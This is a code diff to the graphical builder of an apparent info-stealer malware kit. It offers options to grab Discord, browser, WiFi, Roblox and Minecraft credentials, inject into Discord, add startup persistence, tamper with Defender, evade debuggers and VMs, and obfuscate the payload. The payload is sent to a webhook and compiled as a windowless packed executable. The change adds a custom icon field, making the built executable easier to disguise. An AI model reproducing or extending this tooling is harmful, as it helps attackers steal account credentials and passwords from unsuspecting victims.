@@ -133,16 +133,16 @@ class App(customtkinter.CTk):
         self.discord = customtkinter.CTkCheckBox(
             self.home_frame, text="Discord Info", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.discord.grid(row=1, column=0, sticky="ne", padx=105, pady=70)
+        self.discord.grid(row=1, column=0, sticky="ne", padx=110, pady=70)
 
         self.wifi = customtkinter.CTkCheckBox(self.home_frame, text="Wifi Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                               fg_color="#5d11c3", hover_color="#5057eb")
-        self.wifi.grid(row=1, column=0, sticky="ne", padx=125, pady=115)
+        self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=115)
 
         self.minecraft = customtkinter.CTkCheckBox(
             self.home_frame, text="Minecraft Info", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.minecraft.grid(row=1, column=0, sticky="ne", padx=94, pady=160)
+        self.minecraft.grid(row=1, column=0, sticky="ne", padx=99, pady=160)
 
         self.systeminfo = customtkinter.CTkCheckBox(
             self.home_frame, text="System Info", font=customtkinter.CTkFont(size=17, family=self.font),
@@ -157,7 +157,7 @@ class App(customtkinter.CTk):
         self.browser = customtkinter.CTkCheckBox(
             self.home_frame, text="Browser Info", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.browser.grid(row=1, column=0, sticky="ne", padx=102, pady=205)
+        self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=205)
 
         self.roblox = customtkinter.CTkCheckBox(self.home_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                 fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
@@ -171,21 +171,25 @@ class App(customtkinter.CTk):
         self.injection = customtkinter.CTkCheckBox(
             self.home_frame, text="Injection", font=customtkinter.CTkFont(size=17, family=self.font),
             fg_color="#5d11c3", hover_color="#5057eb")
-        self.injection.grid(row=1, column=0, sticky="ne", padx=125, pady=250)
+        self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=250)
 
         self.fileopts = customtkinter.CTkOptionMenu(self.home_frame, values=[".exe", ".py"],
-                                                    font=customtkinter.CTkFont(size=35, family=self.font), width=250,
-                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
+                                                    font=customtkinter.CTkFont(size=32, family=self.font), width=250,
+                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=lambda x: self.check_icon())
         self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=310)
         self.fileopts.set("File Options")
 
+        self.icon = customtkinter.CTkEntry(self.home_frame, width=250, placeholder_text="Icon Name", font=customtkinter.CTkFont(size=33, family=self.font))
+        self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=310)
+        self.icon.configure(state="disabled")
+
         self.filename = customtkinter.CTkEntry(self.home_frame, width=250, font=customtkinter.CTkFont(size=33, family=self.font),
                                                placeholder_text="File Name")
-        self.filename.grid(row=1, column=0, sticky="ne", padx=85, pady=310)
+        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=380)
 
-        self.build = customtkinter.CTkButton(self.home_frame, width=300, text="Build", font=customtkinter.CTkFont(size=50, family=self.font),
+        self.build = customtkinter.CTkButton(self.home_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
-        self.build.grid(row=1, column=0, sticky="n", padx=85, pady=380)
+        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=380)
 
         self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser,
                            self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord]
@@ -264,6 +268,12 @@ class App(customtkinter.CTk):
         else:
             pass
 
+    def check_icon(self):
+        if self.fileopts.get() == ".exe":
+            self.icon.configure(state="normal")
+        else:
+            self.icon.configure(state="disabled")
+
     def update_config(self, event):
         self.updated_dictionary = {
             "webhook": None,
@@ -333,26 +343,26 @@ class App(customtkinter.CTk):
         self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")
 
     def reset_build_button(self):
-        self.build.configure(width=300, text="Build", font=customtkinter.CTkFont(size=50, family=self.font),
+        self.build.configure(width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                              fg_color="#5d11c3", hover_color="#5057eb")
 
     def building_button_thread(self, thread):
         while thread.is_alive():
-            self.build.configure(width=300, text="Building.", font=customtkinter.CTkFont(size=50, family=self.font),
+            self.build.configure(width=250, text="Building.", font=customtkinter.CTkFont(size=35, family=self.font),
                                  fg_color="#5d11c3", hover_color="#5057eb")
             time.sleep(0.3)
             self.update()
-            self.build.configure(width=300, text="Building..", font=customtkinter.CTkFont(size=50, family=self.font),
+            self.build.configure(width=250, text="Building..", font=customtkinter.CTkFont(size=35, family=self.font),
                                  fg_color="#5d11c3", hover_color="#5057eb")
             time.sleep(0.3)
             self.update()
-            self.build.configure(width=300, text="Building...", font=customtkinter.CTkFont(size=50, family=self.font),
+            self.build.configure(width=250, text="Building...", font=customtkinter.CTkFont(size=35, family=self.font),
                                  fg_color="#5d11c3", hover_color="#5057eb")
             time.sleep(0.3)
             self.update()
 
     def built_file(self):
-        self.build.configure(width=300, text="Built File", font=customtkinter.CTkFont(size=50, family=self.font),
+        self.build.configure(width=250, text="Built File", font=customtkinter.CTkFont(size=35, family=self.font),
                              fg_color="#5d11c3", hover_color="#5057eb")
 
     def return_filename(self):
@@ -382,6 +392,11 @@ class App(customtkinter.CTk):
         return code
 
     def compile_file(self, filename):
+        exeicon = self.icon.get()
+        if exeicon == "":
+            exeicon = None
+        else:
+            exeicon = f"{self.basefilepath}\\{self.icon.get()}.ico"
         try:
             subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--noconsole', '--upx-dir=./tools', '--distpath', './',
                             '--hidden-import', 'base64',
@@ -414,6 +429,7 @@ class App(customtkinter.CTk):
                             '--hidden-import', 'PIL.ImageGrab',
                             '--hidden-import', 'win32crypt',
                             '--hidden-import', 'win32crypt.CryptUnprotectData',
+                            '--icon', f'{exeicon}',
                             f'.\\{filename}.py'], capture_output=True, check=True)
         except Exception as e:
             self.error_log(e)
